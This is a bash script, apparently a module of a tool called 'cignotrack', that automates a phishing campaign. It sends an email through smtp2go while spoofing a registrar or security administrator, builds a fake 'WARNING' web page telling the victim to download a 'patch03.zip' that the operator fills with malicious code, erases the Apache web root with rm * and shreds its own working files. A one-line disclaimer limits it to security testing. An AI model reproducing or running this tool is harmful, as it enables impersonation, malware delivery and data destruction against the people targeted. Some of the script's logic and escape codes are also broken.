#!/bin/bash

bar ()
{
BAR='*0*1*0*1*0*1*0*1*0*1*0*1 \e[00;34m !'    
                         
for i in {0..59}; do
    echo -ne "\r${BAR:0:$i}" 
    sleep 0.05
done
}

echo " "

echo -e "\e[01;33mThis is the social engineering cignotrack module, here you can test security with: "
echo " "
echo -e "\e[01;34mSpoofing trusted security staff email and redirect to a phishing page with malicious download\e[00m"
echo " "
echo -e "\e[00;33mThe spoofing mode use smtp2go and is inspired by M3-SEC spoofmail\e[00m"
echo " "
bar

echo " "
echo -e "\e[01;32mCignotrack is coded by Cignoraptor\e[00;31m just for security testing, the author decline any illegal use\e[00m"
echo " "
echo -e "\e[00;33mEnter smtp username \e[00m(from: \e[00;34mhttps://app.smtp2go.com/settings/users\e[00m ): "
		read smtpu
		echo -e "Enter your smtp password : "
		read smtpk
		clear

sleep 1.5

#spoofing email

echo -e "Enter the organization-target email: "
		read targetm
		echo -e "Email of the registrar server admin / security to spoof (use the whois or leaked email): "
		read secm
		
		echo -e "\e[00;33mChoose 1 for use the pre-configured message or 2 for your own\e[00m"
		read scelta
		if [[ "$scelta" = "1" ]]
		then

		echo -e "\e[01;33mThis is the message: "
		echo " "
		echo -e "\e[01;38mWe find a security issue, you must visit the warning webpage for details\e[00m"
		echo " "
		echo "Insert the host: "
		read paginascam
		echo " "
		echo "We find a security issue, you must visit the warning webpage for details, $paginascam" > scamsec.txt
		read messaggio < scamsec.txt
		sleep 1

		echo " "
		
		elif [[ "$scelta" = "2" ]]
		then
		echo -e "Enter the warning message with the scam link: "
		read messaggio
		echo " "
		
		else 
		echo -e "\e[01;31mYou must choose 1 or 2 -- exiting"
		sleep 1.3
		exit
		
		fi
		
	
        echo "Info" > info.txt
		read soggetto < info.txt

			SMTPSERVER="mail.smtp2go.com"

			SMTPPORT="2525"

		echo -e "Press enter and the process will start: "
		read 

		sendemail -f $secm -t $targetm -u $soggetto -m $messaggio -s "$SMTPSERVER":"$SMTPPORT" -xu "$smtpu" -xp "$smtpk"
echo " "

rm scamsec.txt && rm info.txt

#==================================================
#Pagina scam apache

echo -e "\e[01;38mCreating html scam page\e[00m..."
sleep 0.3

cat > index.html << EOF

<body background="warning.png">
<p>=========================</p>

<h1 align=center style="color:red;">WARNING</h1>

<p style="color:orange;">We had find a vulnerability in our servers, you neeed install the patch</p>

 <a href="patch03.zip">Patch</a> 

<p>=========================</p>

</form>
EOF

echo " "
echo -e "\e[00;31Auto malicious code injection not available in this version, so: " 
pwd > dir.txt
backd=$(cat dir.txt)
echo -e "\e[01;33mInsert your malicious code in this directory ($backd) with name \e[00;31mpatch03.zip\e[00m"
read

cd /var/www/html
echo -e "\e[00;33mAll files in your apache server will be erased, press ENTER: "
read 
rm *
sleep 0.5
cp * /var/www/html

shred -u -z avviascam.sh
shred -u -z dir.txt > /dev/null
cd $backd

shred -u dir.txt > /dev/null

chown -R root /var/www/html
chmod 755 /var/www/html

echo -e "\e[01;32mStarting apache server with the scam page...\e[00m"
sleep 1
service apache2 start

sleep 2
echo -e "\e[01;34FINE\e[00m"





